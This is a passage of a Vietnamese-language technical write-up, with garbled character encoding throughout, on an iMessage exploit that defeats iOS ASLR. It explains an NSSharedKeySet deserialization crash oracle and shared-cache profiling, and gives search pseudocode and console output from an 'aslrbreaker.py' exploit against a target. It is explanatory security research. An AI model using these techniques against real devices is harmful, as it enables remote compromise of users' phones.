<p>ObjC id Ä‘Æ°á»£c Ä‘á»c tá»« má»™t Ä‘á»‹a chá»‰ do ngÆ°á»i táº¥n cÃ´ng kiá»ƒm soÃ¡t sau Ä‘Ã³ id nÃ y sáº½ Ä‘Æ°á»£c so sÃ¡nh vá»›i key Ä‘ang Ä‘Æ°á»£c tÃ¬m kiáº¿m (dÃ²ng 13 cá»§a pháº§n <code class="language-plaintext highlighter-rouge">[NSSharedKeySet indexForKey:]</code>). Náº¿u nhÆ° nÃ³ khÃ´ng tÆ°Æ¡ng Ä‘á»“ng, viá»‡c lookup sáº½ fail vÃ  <code class="language-plaintext highlighter-rouge">[NSSharedKeySet initWithCoder:]</code> sáº½ cá»‘ táº¡o láº¡i NSSharedKeySet tá»« Ä‘áº§u. VÃ¬ tháº¿ nÃªn nÃ³ sáº½ gá»i <code class="language-plaintext highlighter-rouge">[NSSharedKeySet allKeys]</code> trong <code class="language-plaintext highlighter-rouge">subKeySet</code> cá»§a nÃ³. KhÃ´ng may ráº±ng, vÃ¬ <code class="language-plaintext highlighter-rouge">subKeySet</code> chÆ°a hoÃ n toÃ n Ä‘Æ°á»£c khá»Ÿi táº¡o (bug cÃ³ nháº¯c Ä‘áº¿n á»Ÿ pháº§n 1), phÆ°Æ¡ng thá»©c <code class="language-plaintext highlighter-rouge">allKeys</code> sáº½ crash ngay láº­p tá»©c khi nÃ³ truy cáº­p vÃ o máº£ng <code class="language-plaintext highlighter-rouge">_keys</code> khi nÃ³ váº«n lÃ  nullptr (máº£ng rá»—ng, chÆ°a Ä‘Æ°á»£c khá»Ÿi táº¡o). Máº·c dÃ¹ váº­y, ta váº«n cÃ³ thá»ƒ lÃ m viá»‡c vá»›i chÃºng:</p>

<p><img src="https://miro.medium.com/max/800/0*H5cwg78sSnpd3CGB.png" alt="Image for post" style="zoom:80%;" /></p>

<p>Trick á»Ÿ Ä‘Ã¢y lÃ  ta thÃªm vÃ o cuá»‘i máº£ng má»™t KeySet má»›i (SharedKeySet3), keyset nÃ y sáº½ luÃ´n cÃ³ thá»ƒ look up key thá»© hai (â€œk2â€). Tuy nhiÃªn, do KeySet nÃ y Ä‘Ã£ trá»Ÿ thÃ nh subKeySet má»›i cá»§a <code class="language-plaintext highlighter-rouge">SharedKeySet1</code>, nÃªn <code class="language-plaintext highlighter-rouge">SharedKeySet2</code> báº¯t buá»™c pháº£i Ä‘Æ°á»£c unarchive (giáº£i nÃ©n) báº±ng cÃ¡ch khÃ¡c. Váº¥n Ä‘á» nÃ y chá»‰ kháº£ thi khi ta unarchive <code class="language-plaintext highlighter-rouge">SharedKeyDictionary</code> trÆ°á»›c báº±ng cÃ¡ch thÃ´ng qua máº£ng <code class="language-plaintext highlighter-rouge">_keys</code> cá»§a <code class="language-plaintext highlighter-rouge">SharedKeySet1</code>. Xui lÃ  whitelist cá»§a class nÃ y khi Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ unarchive <code class="language-plaintext highlighter-rouge">_keys</code> khÃ´ng há» xÃ i Ä‘áº¿n NSDictionary. DÃ¹ váº­y, class <code class="language-plaintext highlighter-rouge">__NSLocalizedString</code> (báº£n thÃ¢n nÃ³ giá»‘ng NSString) cÃ³ má»™t Ä‘oáº¡n code giÃºp ta decode config dictionary cá»§a nÃ³:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>NSSet* classes = [NSSet setWithObjects:[NSDictionary class], ...];
NSDictionary* configDict = [coder decodeObjectOfClasses:classes 
                                  forKey:@"NS.configDict"]
</pre></td></tr></tbody></table></code></pre></div></div>

<p>VÃ¬ NSSharedKeyDictionary cÃ³ thá»ƒ Ä‘Æ°á»£c decode trong khi máº£ng <code class="language-plaintext highlighter-rouge">_keys</code> Ä‘ang Ä‘Æ°á»£c giáº£i nÃ©n báº±ng cÃ¡ch â€œgÃ³i gá»nâ€ báº£n thÃ¢n nÃ³ vÃ o __NSLocalizedString.</p>

<p>Báº±ng cÃ¡ch nÃ y, viá»‡c unarchive payload chá»‰ crash khi Ä‘Ã¡p á»©ng má»™t trong hai yáº¿u tá»‘:</p>

<ol>
  <li>Náº¿u Ä‘á»‹a chá»‰ (trong trÆ°á»ng há»£p nÃ y <code class="language-plaintext highlighter-rouge">0x41414140</code> Ä‘Æ°á»£c xem nhÆ° index cá»§a <code class="language-plaintext highlighter-rouge">_rankTable</code> Ä‘Æ°á»£c nhÃ¢n lÃªn 8) khÃ´ng Ä‘á»c Ä‘Æ°á»£c (hay chÆ°a Ä‘Æ°á»£c map láº¡i).</li>
  <li>Náº¿u viá»‡c gá»i <code class="language-plaintext highlighter-rouge">[key isEqual:candidate]</code> vá»›i giÃ¡ trá»‹ Ä‘Æ°á»£c Ä‘Æ°á»£c tá»« Ä‘á»‹a chá»‰ bá»‹ crash.</li>
</ol>

<p>Náº¿u cÃ³ giÃ¡ trá»‹ lÃ  0, <code class="language-plaintext highlighter-rouge">[key isEqual:]</code> sáº½ khÃ´ng Ä‘Æ°á»£c gá»i. NgÆ°á»£c láº¡i, náº¿u giÃ¡ trá»‹ khÃ´ng Ä‘Æ°á»£c set MSB, nÃ³ sáº½ Ä‘Æ°á»£c xem nhÆ° má»™t con trá» Ä‘áº¿n ObjC object vÃ  cÃ¡c phÆ°Æ¡ng thá»©c sáº½ Ä‘Æ°á»£c gá»i dá»±a theo nÃ³, cháº¯c cháº¯n viá»‡c nÃ y sáº½ dáº«n Ä‘áº¿n crash <em>trá»« khi giÃ¡ trá»‹ con trá» lÃ  má»™t ObjC object</em>. Cuá»‘i cÃ¹ng, náº¿u giÃ¡ trá»‹ Ä‘Ã£ Ä‘Æ°á»£c set MSB, nÃ³ sáº½ dÆ°á»£c xem nhÆ° má»™t con trá» vÃ¹ng nhá»› (tagged pointer) vÃ  class cá»§a nÃ³ sáº½ há»£p lá»‡. Äiá»u nÃ y xáº£y ra báº±ng cÃ¡ch XOR con trá» vÃ¹ng nhá»› vá»›i <em>má»™t giÃ¡ trá»‹ random Ä‘Æ°á»£c mÃ£ hÃ³a</em>, sau Ä‘Ã³ truyá»n index vÃ o class table tá»« cÃ¡c bit cao hÆ¡n vÃ  sá»­ dá»¥ng nÃ³. Do giÃ¡ trá»‹ XOR chung vá»›i tagged pointer bá»‹ mÃ£ hÃ³a, ta khÃ´ng thá»ƒ biáº¿t ráº±ng giÃ¡ trá»‹ nÃ o khi truyá»n vÃ o con trá» sáº½ lÃ m crash. Tuy nhiÃªn cÃ³ má»™t giáº£i phÃ¡p khiáº¿n ta dÃ¹ cÃ³ truyá»n má»™t Ä‘á»‹a chá»‰ sai vÃ o tagged pointer thÃ¬ cÅ©ng sáº½ khÃ´ng gÃ¢y crash: ChÃ­nh lÃ  nhá» phÆ°Æ¡ng thá»©c <code class="language-plaintext highlighter-rouge">[NSCFString isEqual:]</code>, nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng khi key Ä‘ang tham chiáº¿u lÃ  má»™t chuá»—i:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre>if (a3 &amp; 0x8000000000000000) {
  // Extract class index from tagged pointer
  v5 = ((a3 ^ objc_debug_taggedpointer_obfuscator) &gt;&gt; 60) &amp; 7;
  if ( v5 == 7 )
    // Use extended class index in bits 52 - 60
    v5 = (((a3 ^ objc_debug_taggedpointer_obfuscator) &gt;&gt; 52) &amp; 0xFF) + 8;// Check class index equals the one for NSString
  if ( v5 == 2 )
    // If yes, extract string content from lower bits and compare
    return _NSTaggedPointerStringEqualCFString(a3, self);// If not, just return false directly
  return 0;
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>PhÆ°Æ¡ng thá»©c nÃ y khiáº¿n cho má»i giÃ¡ trá»‹ cÃ³ cá» MSB set Ä‘Æ°á»£c sá»­ dá»¥ng nhÆ° tham biáº¿n mÃ  khÃ´ng táº¡o ra crash.</p>

<p>Káº¿t há»£p nhá»¯ng thá»© trÃªn, oracle function Ä‘Ã£ trá»Ÿ nÃªn khÃ¡i quÃ¡t hÆ¡n:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>oracle(addr):
  if isMapped(addr) and 
     (isZero(*addr) or hasMSBSet(*addr) or pointsToObjCObject(*addr)):
    nocrash()
  else:
    crash()
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Äá»ƒ sá»­ dá»¥ng hÃ m oracle nÃ y, ta cáº§n pháº£i build má»™t â€œprofileâ€ trÃªn vÃ¹ng shared cache trÃªn mÃ¡y náº¡n nhÃ¢n (má»™t vÃ¹ng bitmap), giÃ¡ trá»‹ â€˜0â€™ cÃ³ nghÄ©a viá»‡c truy cáº­p sáº½ crash vÃ  â€˜1â€™ thÃ¬ khÃ´ng. VÃ¬ vÃ¹ng shared cache giá»‘ng nhau hoÃ n toÃ n trÃªn cÃ¡c thiáº¿t bá»‹ iPhone cÃ³ hardware model giá»‘ng nhau vÃ  cÃ¹ng phiÃªn báº£n iOS, viá»‡c nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c hiá»‡n báº±ng cÃ¡ch cháº¡y má»™t custom app trÃªn má»™t thiáº¿t bá»‹ tÆ°Æ¡ng Ä‘á»“ng vÃ  scan toÃ n bá»™ vÃ¹ng shared cache trong bá»™ nhá»›. TrÃªn thá»±c táº¿, profile cÅ©ng nÃªn há»— trá»£ má»™t tráº¡ng thÃ¡i â€œdá»± phÃ²ngâ€ Ä‘á»ƒ khi gáº·p hai trÆ°á»ng há»£p 0/1 trÃªn bitmap. NhÆ°ng Ä‘á»ƒ Ä‘Æ¡n giáº£n hÃ³a váº¥n Ä‘á», giáº£i thÃ­ch sau sáº½ giáº£ Ä‘á»‹nh profile chá»‰ bao gá»“m hai tráº¡ng thÃ¡i chÃ­nh.</p>

<p>Bitmap cho má»™t profile gá»“m hai tráº¡ng thÃ¡i nhÆ° sau:</p>

<p><img src="https://miro.medium.com/max/800/0*nQYTEoKDkRjcSqTP.png" alt="Image for post" /></p>

<p>BÆ°á»›c káº¿ tiáº¿p lÃ  sá»­ dá»¥ng hÃ m <code class="language-plaintext highlighter-rouge">oracle</code> dá»ƒ tÃ¬m kiáº¿m tuyáº¿n tÃ­nh giá»¯a vÃ¹ng 0x18000000 vÃ  0x28000000 cho Ä‘áº¿n khi khÃ´ng cÃ³ crash nÃ o xáº£y ra. Sau Ä‘Ã³, tÃ­nh toÃ¡n cÃ¡c Ä‘á»‹a chá»‰ trong shared cache báº±ng cÃ¡ch láº·p profile vá»›i pagesized step (page memory lÃ  vÃ¹ng nhá»› áº£o). Trong thá»±c táº¿, bÆ°á»›c nÃ y sáº½ cho káº¿ quáº£ tá»« 30000~40000 cÃ¡c <code class="language-plaintext highlighter-rouge">base_address</code> khÃ¡c nhau (candidate).</p>

<p>Tiáº¿p theo, má»™t thuáº­t toÃ¡n tÃ¬m kiáº¿m sáº½ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ nÃ¢ng cao hiá»‡u suáº¥t tÃ¬m ra Ä‘á»‹a chá»‰ chÃ­nh xÃ¡c mÃ  chá»‰ sá»­ dá»¥ng má»™t lÆ°á»£ng Ã­t truy váº¥n oracle (má»—i truy váº¥n oracle sáº½ máº¥t khoáº£ng 10s Ä‘á»ƒ trÃ¡nh viá»‡c imagent bá»‹ crash quÃ¡ nhanh). áº¢nh sau sáº½ biá»ƒu diá»…n shared cache map láº«n nhau báº±ng cÃ¡c <code class="language-plaintext highlighter-rouge">base_address</code></p>

<p><img src="https://miro.medium.com/max/1600/0*P25quU1fYgWdCN3u.png" alt="Image for post" /></p>

<p>Má»¥c Ä‘Ã­ch hiá»‡n táº¡i cá»§a chÃºng ta lÃ  tÃ¬m má»™t Ä‘á»‹a chá»‰ má»›i báº±ng cÃ¡i gá»­i truy váº¥n oracle. Äá»‹a chá»‰ má»›i nÃ y sáº½ cho phÃ©p loáº¡i Ä‘i Ã­t nháº¥t ná»­a sá»‘ <code class="language-plaintext highlighter-rouge">base_address</code> khÃ´ng há»£p lá»‡ mÃ  ta Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c (cÃ²n ~15000 Ä‘áº¿n 20000). Giá» hÃ£y chÃº Ã½ vÃ o Ä‘á»‹a chá»‰ <code class="language-plaintext highlighter-rouge">0x19020c028</code> (mÃ u xanh lÃ¡), náº¿u crash xuáº¥t hiá»‡n khi ta Ä‘ang truy váº¥n oracle cho Ä‘á»‹a chá»‰ Ä‘Ã³ thÃ¬ chá»‰ cÃ³ <code class="language-plaintext highlighter-rouge">base_address</code> Ä‘áº§u tiÃªn vÃ  cuá»‘i cÃ¹ng Ä‘Æ°á»£c giá»¯ láº¡i, cÃ²n náº¿u nÃ³ khÃ´ng crash thÃ¬ cÃ³ ba <code class="language-plaintext highlighter-rouge">base_address</code> á»Ÿ giá»¯a sáº½ Ä‘Æ°á»£c giá»¯ láº¡i.</p>

<p><em>(Xem hÃ¬nh giáº£i thÃ­ch á»Ÿ dÆ°á»›i Ä‘á»ƒ hiá»ƒu táº¡i sao khi crash Ä‘á»‹a chá»‰ mÃ u xanh láº¡i loáº¡i Ä‘Æ°á»£c ba</em> <code class="language-plaintext highlighter-rouge">base_address</code> <em>á»Ÿ giá»¯a vÃ  ngÆ°á»£c láº¡i)</em></p>

<p><img src="https://miro.medium.com/max/1600/1*vg3qIupTwHb7VooRR_0e6g.png" alt=" Hai Ã´ mÃ¬nh khoanh trÃ²n lÃ  cÃ¡c chunk data mÃ  0x19020c028 tham chiáº¿u Ä‘áº¿n" /></p>

<p>Tá»« Ä‘Ã³ ta sáº½ cÃ³ Ä‘Æ°á»£c cÃ¡c <code class="language-plaintext highlighter-rouge">base_address</code> cáº§n tÃ¬m, Ä‘á»“ng thá»i viá»‡c nÃ y cÅ©ng Ä‘Ã£ cho biáº¿t tá»‰ lá»‡ cá»§a viá»‡c crash (trong trÆ°á»ng há»£p nÃ y lÃ  2/5). Ta suy ra Ä‘Æ°á»£c sá»‘ lÆ°á»£ng <code class="language-plaintext highlighter-rouge">base_address</code> cÃ²n láº¡i (E) sau khi truy váº¥n oracle:
\(E = 3/5 * 3 + 2/5 * 2 = 2.6\)
Sau khi láº·p liÃªn tá»¥c, thuáº­t toÃ¡n sáº½ chá»n ra Ä‘á»‹a chá»‰ vá»›i giÃ¡ trá»‹ (E) nhá» nháº¥t. LÃ½ tÆ°á»Ÿng lÃ  khi cÃ¡c sá»‘ 1 vÃ  0 trong profile gáº§n nhÆ° cÃ¢n báº±ng (thá»±c táº¿ thÃ¬ cÃ³ thá»ƒ nhiá»u hoáº·c Ã­t hÆ¡n) thÃ¬ <code class="language-plaintext highlighter-rouge">base_address</code> vá»›i sá»‘ (E) Ã­t nháº¥t sáº½ Ä‘Æ°á»£c tÃ¬m ra trong vÃ²ng 2â€“5 phÃºt.</p>

<p>Khi á»©ng dá»¥ng thuáº­t toÃ¡n nÃ y, ta sáº½ gáº·p pháº£i má»™t váº¥n Ä‘á» nhá» vá» hiá»‡u suáº¥t vÃ¬ khi thá»±c hiá»‡n full search cho cÃ¡c <code class="language-plaintext highlighter-rouge">base_address</code>, sá»‘ operation pháº£i cháº¡y Ä‘Æ°á»£c tÃ­nh theo cÃ´ng thá»©c: <code class="language-plaintext highlighter-rouge">shared_cache_size / 8 * num_candidates</code>. Viá»‡c nÃ y cÃ³ thá»ƒ khiáº¿n sá»‘ operation lÃªn Ä‘áº¿n nghÃ¬n tá»‰ (10Â¹Â²). Máº·c dÃ¹ váº­y, trong thá»±c táº¿ thÃ¬ chÃºng ta khÃ´ng test tuáº§n tá»± tá»«ng Ä‘á»‹a chá»‰ mÃ  chá»‰ cáº§n test ngáº«u nhiÃªn 100 Ä‘á»‹a chá»‰ khÃ¡c nhau mÃ  thÃ´i.</p>

<p>Má»™t váº¥n Ä‘á» khÃ¡c xuáº¥t hiá»‡n khi ta sá»­ dá»¥ng â€œprofile-ba-tráº¡ng-thÃ¡iâ€ Ä‘Æ°á»£c nháº¯c Ä‘áº¿n á»Ÿ trÃªn thÃ¬ thuáº­t toÃ¡n sáº½ ngáº§m Ä‘á»‹nh cÃ¡c writable-memory-page (má»™t vÃ¹ng nhá»›) vá»«a cÃ³ thá»ƒ crash vá»«a cÃ³ thá»ƒ khÃ´ng (50/50) vÃ¬ ta khÃ´ng biáº¿t Ä‘Æ°á»£c giÃ¡ trá»‹ nÃ o sáº½ náº±m trong vÃ¹ng nhá»› Ä‘Ã³ vÃ o thá»i Ä‘iá»ƒm runtime. Tuy nhiÃªn, má»™t láº§n ná»¯a, thÃ¬ kháº£ nÄƒng crash trong thá»±c táº¿ láº¡i hoáº¡t Ä‘á»™ng bÃ¬nh thÆ°á»ng vÃ¬ váº¥n Ä‘á» nhá» nÃ y khÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n Ä‘á»™ chÃ­nh xÃ¡c cá»§a thuáº­t toÃ¡n trÃªn.</p>

<p>Sau Ä‘Ã¢y lÃ  pseudocode phiÃªn báº£n hoÃ n thiá»‡n cá»§a thuáº­t toÃ¡n trÃªn:</p>

<pre><code class="language-pseudocode">candidates = [...]
while len(candidates) &gt; 1:
  best_address = 0x0
  best_E = len(candidates)
  remaining_candidates_on_crash = None
  remaining_candidates_on_nocrash = Nonefor _ in range(0, 100):
    addr = random.randrange(minbase, maxbase, 8)
    crashset = []
    nocrashset = []
    for profile in candidates:
      if profile.addr_will_crash(addr):
        crashset.append(profile)
      if profile.addr_will_not_crash(addr):
        nocrashset.append(profile)crash_prob = len(crashset) / len(candidates)
    nocrash_prob = 1.0 - crash_prob 
    E = crash_prob * len(crashset) + nocrash_prob * len(nocrashset)
    if E &lt; best_E:
      best_E = E
      best_address = addr
      remaining_candidates_on_crash = crashset
      remaining_candidates_on_nocrash = nocrashsetif oracle(best_address):
    candidates = remaining_candidates_on_nocrash
  else:
    candidates = remaining_candidates_on_crash
</code></pre>

<p>Output cá»§a exploit:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre></td> --><td class="rouge-code"><pre><span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">aslrbreaker</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Note</span><span class="p">:</span> <span class="n">this</span> <span class="n">exploit</span> <span class="o">*</span><span class="n">deliberately</span><span class="o">*</span> <span class="n">displays</span> <span class="n">notifications</span> <span class="n">to</span> <span class="n">the</span> <span class="n">target</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">find</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">address</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x180000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x188000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x190000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x198000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x1a0000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x1a8000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x1b0000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x1b8000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">address</span> <span class="mh">0x1c0000000</span><span class="p">...</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mh">0x1c0000000</span> <span class="ow">is</span> <span class="n">valid</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Have</span> <span class="mi">34353</span> <span class="n">potential</span> <span class="n">candidates</span> <span class="k">for</span> <span class="n">the</span> <span class="n">dyld_shared_cache</span> <span class="n">slide</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Shared</span> <span class="n">cache</span> <span class="ow">is</span> <span class="n">mapped</span> <span class="n">somewhere</span> <span class="n">between</span> <span class="mh">0x181948000</span> <span class="ow">and</span> <span class="mh">0x203d64000</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Now</span> <span class="n">determining</span> <span class="n">exact</span> <span class="n">base</span> <span class="n">address</span> <span class="n">of</span> <span class="n">shared</span> <span class="n">cache</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">34353</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1b12070d0</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">17208.40</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">17906</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1b8a353d8</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">9144.48</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">9656</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1bcb23de0</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">5093.02</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">5104</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1e172e3f8</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">2754.83</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">2682</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1b363c658</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">1454.06</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">1728</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1e0301200</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">929.21</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">915</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1b0c04368</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">497.63</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">593</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1e0263068</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">319.15</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">326</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1bec43868</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">163.84</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">156</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1c15ab0e8</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">78.21</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">82</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1c49efe90</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">41.02</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">40</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1befd60f8</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">20.00</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">20</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1c14089d0</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">10.00</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">10</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1c428d450</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">5.00</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">5</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1df0939f0</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">2.60</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mi">2</span> <span class="n">candidates</span> <span class="n">remaining</span><span class="p">...</span>
